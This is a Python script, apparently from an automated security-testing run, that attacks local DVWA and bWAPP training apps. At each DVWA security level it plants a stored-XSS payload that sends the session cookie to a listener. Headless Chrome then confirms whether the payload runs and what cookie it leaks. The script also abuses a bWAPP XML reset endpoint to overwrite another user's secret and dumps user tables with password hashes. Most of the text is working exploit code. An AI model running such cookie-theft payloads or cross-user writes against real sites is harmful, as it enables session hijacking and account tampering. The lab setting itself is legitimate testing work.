#!/usr/bin/env python3
# loop3 t4 probe15: 干净的分级对照（B5）+ bWAPP medium 分支写入语义澄清 + 最终状态
import json, re, subprocess, time, datetime, os, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

BASE = "http://127.0.0.1"
UA = "loop3-t4/1.0 (authorized local lab)"
GAP = 1.2
PORT = 8099
LOG = "/tmp/loop3-t4-probe15-sink.jsonl"
FACTORY = "Any bugs?"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:900], flush=True)
    return kw


def sh(c):
    r = subprocess.run(c, shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def db(q):
    return sh(f'sudo -n mariadb -N -e "{q}"')


class Sink(BaseHTTPRequestHandler):
    def do_GET(self):
        e = {"at": datetime.datetime.now().isoformat(), "path": self.path, "headers": dict(self.headers)}
        open(LOG, "a").write(json.dumps(e) + "\n")
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        self.wfile.write(b"GIF89a")

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", PORT), Sink)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.4)


def sink_entries():
    return [json.loads(l) for l in open(LOG)] if os.path.exists(LOG) else []


def dvwa(level):
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.cookies.set("security", level, domain="127.0.0.1", path="/")
    r = s.get(BASE + "/dvwa/login.php", timeout=20)
    m = re.search(r"name='user_token' value='([^']+)'", r.text)
    time.sleep(GAP)
    s.post(BASE + "/dvwa/login.php",
           data={"username": "admin", "password": "password", "Login": "Login", "user_token": m.group(1)},
           allow_redirects=False, timeout=20)
    return s


rec("guestbook_before", v=db("SELECT comment_id,name,LEFT(comment,40) FROM dvwa.guestbook;"))

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By

o = Options()
o.binary_location = "/usr/bin/chromium"
for a in ("--headless=new", "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"):
    o.add_argument(a)
d = webdriver.Chrome(service=ChromeService(executable_path="/usr/bin/chromedriver"), options=o)


def browser_login(level):
    d.delete_all_cookies()
    d.get(BASE + "/dvwa/login.php")
    d.add_cookie({"name": "security", "value": level, "domain": "127.0.0.1", "path": "/"})
    d.get(BASE + "/dvwa/login.php")
    d.find_element(By.NAME, "username").send_keys("admin")
    d.find_element(By.NAME, "password").send_keys("password")
    d.find_element(By.NAME, "Login").click()
    time.sleep(GAP)


# ---- 干净的分级对照：每级插入独立标记载荷，浏览器访问，记录是否执行 ----
results = []
for level in ("low", "medium", "high", "impossible"):
    tag = "LO3LVL" + level.upper()[:4]
    payload = ('<script>new Image().src="http://127.0.0.1:%d/lvl?t=%s&c="'
               '+encodeURIComponent(document.cookie)</script>') % (PORT, tag)
    S = dvwa(level)
    S.cookies.set("security", level, domain="127.0.0.1", path="/")
    time.sleep(GAP)
    S.post(BASE + "/dvwa/vulnerabilities/xss_s/",
           data={"txtName": "loop3t4lvl_" + level, "mtxMessage": payload, "btnSign": "Sign Guestbook"}, timeout=20)
    time.sleep(GAP)
    stored = db("SELECT comment FROM dvwa.guestbook WHERE name='loop3t4lvl_%s' ORDER BY comment_id DESC LIMIT 1;" % level)
    browser_login(level)
    n0 = len(sink_entries())
    d.get(BASE + "/dvwa/vulnerabilities/xss_s/")
    time.sleep(3.0)
    new = sink_entries()[n0:]
    hit = [h for h in new if ("t=%s" % tag) in h["path"]]
    src = d.page_source
    r = {"level": level, "stored_row": stored[:120], "stored_is_raw_script": stored.strip().startswith("<script>"),
         "executed_and_leaked": bool(hit),
         "leaked_cookie": (hit[0]["headers"].get("Cookie") if hit else None),
         "raw_payload_in_dom": payload in src,
         "all_new_sink_paths": [h["path"][:70] for h in new][:6],
         "document_cookie": d.execute_script("return document.cookie")}
    results.append(r)
    rec("B5_LEVEL_" + level, **r)
    time.sleep(GAP)

# 清理我自己插入的分级对照行
rec("cleanup_tier_rows", v=db("DELETE FROM dvwa.guestbook WHERE name LIKE 'loop3t4lvl_%'; SELECT ROW_COUNT();"))
rec("guestbook_after", v=db("SELECT comment_id,name,LEFT(comment,40) FROM dvwa.guestbook;"))
rec("guestbook_count", v=db("SELECT COUNT(*) FROM dvwa.guestbook;"))
d.quit()

# ---- bWAPP medium 分支写入语义澄清（决定性：XML login 是否被使用）----
B = requests.Session()
B.headers["User-Agent"] = UA
B.cookies.set("security_level", "1", domain="127.0.0.1", path="/")
B.post(BASE + "/bWAPP/login.php", data={"login": "bee", "password": "bug", "security_level": "1", "form": "submit"},
       allow_redirects=False, timeout=20)
seclev_page = B.get(BASE + "/bWAPP/csrf_3.php", timeout=20)
rec("bwapp_medium_context", server_level=re.findall(r"Current:\s*<b>(\w+)</b>", seclev_page.text))
time.sleep(GAP)
before = db("SELECT login,secret FROM bWAPP.users;")
r = B.post(BASE + "/bWAPP/xxe-2.php",
           data=b'<?xml version="1.0"?><reset><login>A.I.M.</login><secret>MED-USES-SESSION-LOGIN-probe15</secret></reset>',
           headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=20)
time.sleep(GAP)
after = db("SELECT login,secret FROM bWAPP.users;")
rec("bwapp_medium_xml_login_ignored", before=before, after=after, resp=r.text[:80],
    note="medium 分支写 $_SESSION['login']（=bee），忽略 XML 中的 <login>；即 medium/high 存在跨用户写入语义差异")
time.sleep(GAP)
B.post(BASE + "/bWAPP/xxe-2.php",
       data=('<?xml version="1.0"?><reset><login>bee</login><secret>' + FACTORY + '</secret></reset>').encode(),
       headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=20)
time.sleep(GAP)
rec("bwapp_restored", v=db("SELECT login,secret FROM bWAPP.users;"))

# ---- 最终状态 ----
rec("final_docroot", v=sh("ls -la /var/www/html/"))
rec("final_lo3_teach", http=requests.get(BASE + "/lo3-teach/noent.php", timeout=10).status_code)
rec("final_services", v=sh("systemctl is-active apache2 mariadb"))
rec("final_lo3_sessions", v=sh("sudo -n ls /var/lib/php/sessions/ | grep -icE 'loop3|LO3' || echo 0"))
rec("final_bwapp", v=db("SELECT id,login,secret,password FROM bWAPP.users;"))
rec("final_dvwa_users", v=db("SELECT user_id,user,password FROM dvwa.users;"))
rec("final_blog_count", v=db("SELECT COUNT(*) FROM bWAPP.blog;"))

with open("/tmp/loop3-t4-probe15.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
srv.shutdown()
print(json.dumps({"rc": "ok", "levels": results}))
